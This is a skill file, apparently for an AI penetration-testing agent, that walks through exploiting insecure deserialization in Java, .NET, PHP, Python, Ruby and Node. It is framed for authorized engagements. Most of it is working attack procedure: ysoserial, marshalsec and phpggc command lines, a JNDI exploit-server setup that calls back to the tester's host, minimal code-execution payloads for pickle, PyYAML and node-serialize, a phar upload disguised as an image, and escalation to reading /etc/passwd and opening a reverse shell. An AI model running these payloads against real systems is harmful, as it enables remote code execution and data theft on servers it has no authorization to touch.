---
name: deserialization
description: "Invoke this skill for live insecure-deserialization testing across Java, .NET, PHP, Python, Ruby and Node — format identification, gadget selection, callback-based blind proof, and framework-specific paths like Shiro, ViewState and phar metadata. Deserialization only, code review stays in codeaudit."
---
# Insecure Deserialization

Turning a serialized blob the app trusts into execution. Under an **authorized** engagement only. Blind claims are the norm here, so the proof ladder is strict.

Precondition: a serialized value the client can influence — cookie, hidden field, view state, queue message, cache value, `phar://` path, or an API body that names a class.

Related: `parser-and-upload-exploitation` for the upload that delivers a serialized blob or gadget archive; `cve-intel` when the framework version maps to a known gadget-chain CVE.

## Hard gates

1. Identify the format before generating payloads; a wrong format just looks like a crash.
2. Callback proof beats command output; a DNS or HTTP hit is enough for blind cases. `sleep` alone is weak.
3. One payload family per request; never stack gadgets.
4. Framework gadgets are version-specific — check the version first and say when it is unknown.
5. Do not fire memory-heavy gadget chains at production repeatedly; each attempt can pin a CPU.

## Phase 1: format identification

| Signal | Format |
|---|---|
| Base64 starting `rO0AB` | Java serialized stream |
| `\xac\xed\x00\x05` raw | Java serialized stream |
| `__VIEWSTATE` field, `__EVENTVALIDATION` | ASP.NET ViewState |
| `O:8:"stdClass"`, `a:2:{` | PHP serialize |
| `gASV`, `\x80\x04\x95` | Python pickle |
| `\x04\x08` | Ruby Marshal |
| `{"_$$ND_FUNC$$_...` | node-serialize |
| JSON with `@type`, `@class` | Jackson default typing / Fastjson / XStream |

- Search cookies, hidden fields, and API bodies for the markers.
- Base64-decode anything opaque and re-check; also try double base64.

## Phase 2: Java

- `ysoserial <gadget> "<command>" > payload.bin` — start with `URLDNS` for blind reachability, then a real gadget.
- Common gadgets when the library set is unknown: `CommonsCollections4/5/6`, `CommonsBeanutils1`, `Groovy1`, `Spring1`, `JRMPClient`.
- Delivery: Base64 into the cookie/field, raw bytes into the body.
- Framework paths:
  - **Shiro**: `rememberMe=` cookie; the key is often a known default — `ysoserial` output AES-encrypted with the key and Base64d.
  - **Fastjson**: `{"@type":"java.net.Inet4Address","val":"<oob>"}` for reachability, then a JNDI/RMI gadget.
  - **Jackson**: `@class` typing; `Cannot construct instance` errors confirm it is live.
  - **XStream**: XML body with a `DynamicProxyConverter`-style chain.
- Callback: `URLDNS` + a DNS name you control; command: `id > /tmp/artx` plus an outbound curl.

### JNDI delivery (live, no deserialization sink needed)

Two servers cover a JNDI lookup the target resolves (`${jndi:...}`, a `JNDI` connection property, an RMI/LDAP reference):

```
# 1) all-in-one: exploit class + HTTP server + LDAP/RMI listener, prints ready links
java -jar /opt/tools/jndi.jar -C "id" -A <our-ip>
# 2) treat a JDK-only path: LDAPRefServer for a pre-hosted class
python3 -m http.server 8000 --directory /opt/tools/jndi-classes &
marshalsec LDAPRefServer "http://<our-ip>:8000/#Exploit"
```

`marshalsec Java <gadget> "<cmd>"` also emits raw deserialization payloads for the non-JNDI gadgets (`XBean`, `CommonsBeanutils`). JDK gating matters: `trustURLCodebase=false` (JDK 8u191+/11+) means the LDAP reference must point at a serialized gadget, not a remote class — the all-in-one jar prints both link shapes, pick the one matching the target JDK, and prefer local-factory gadgets when the JDK is unknown. Both servers bind high ports: open one at a time and kill it before starting the other.

## Phase 3: .NET

- ViewState: `ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --path="/<page>" --apppath="/" --decryptionalg="AES" --decryptionkey="<key>" --validationalg="HMACSHA256" --validationkey="<key>"`.
- Key sources: `__VIEWSTATE` without `--islocal` means machineKey is needed; look for `machineKey` in `web.config` leaks, or test `--islocal`.
- Other formatters: `BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter` on `__EVENTVALIDATION`.
- `ysoserial.exe -l` lists gadgets; `-g TypeConfuseDelegate` is the usual starting point.
- Known limitation on this image: lives under mono, so some gadget/`-c` combinations throw `NullReferenceException`. Retry with `-f BinaryFormatter -o base64` and put `-c` last; if it still faults, generate the payload on a Windows host and note the fallback.

## Phase 4: PHP

- `phpggc -l` for chains; match the framework (Laravel, Symfony, Monolog, Guzzle, Doctrine).
- Cookie/body delivery: `phpggc Laravel/RCE1 system id -b` for Base64.
- Phar metadata: a `phar://` path reaching a file function triggers the chain. Build with `phpggc -p phar`, rename the archive to `.jpg`, upload, then reference it.
- `unserialize()` on a parameter plus a matching autoloader is the base condition; missing classes are a silent failure, so start with a chain for a class the app certainly has.

## Phase 5: Python, Ruby, Node

- Python pickle: `pickle.loads` on a cookie or body; a `__reduce__` returning `(os.system, ("id",))` is the minimal payload.
- PyYAML `yaml.load` (not `safe_load`): `!!python/object/apply:os.system ["id"]`.
- Ruby Marshal: `Marshal.load`; gadget chains via `universal-deserializer` style payloads, or a `Gem::Requirement` chain.
- Node: `node-serialize` `_$$ND_FUNC$$_function(){...}()` with the IIFE suffix; also `serialize-javascript` bypasses.

## Phase 6: proof and escalation

1. Reachability (URLDNS / DNS callback / error class name).
2. Execution (`id` output, outbound HTTP with a marker path).
3. Impact: file read (`cat /etc/passwd` through the command), then a single reverse shell only if the task wants one.

Capture both the request with the raw payload (saved to a file) and the callback log or command output.

## False-positive traps

- A 500 on every deserialization attempt read as "vulnerable".
- URLDNS resolving from an unrelated prefetch.
- Base64 payload with a stripped trailing `=`.
- Gadget for a library the app does not have.
- ViewState tampering on a page with `EnableViewStateMac` when the machineKey is per-app and unknown.

## Tool and pacing table

| Tool | Use | Flags |
|---|---|---|
| ysoserial | Java payloads | local |
| ysoserial.exe | .NET payloads | local, via mono |
| phpggc | PHP chains | local |
| curl | delivery | one request in flight |
| dnsx / a listener | callback proof | single listener |

## Completion self-check

- [ ] format identified, not guessed.
- [ ] payload family matches a library that is plausibly present, or is marked unknown-version.
- [ ] execution proven by callback or output, not status code.
- [ ] raw payload saved as an artifact.
- [ ] one payload per attempt, attempts counted.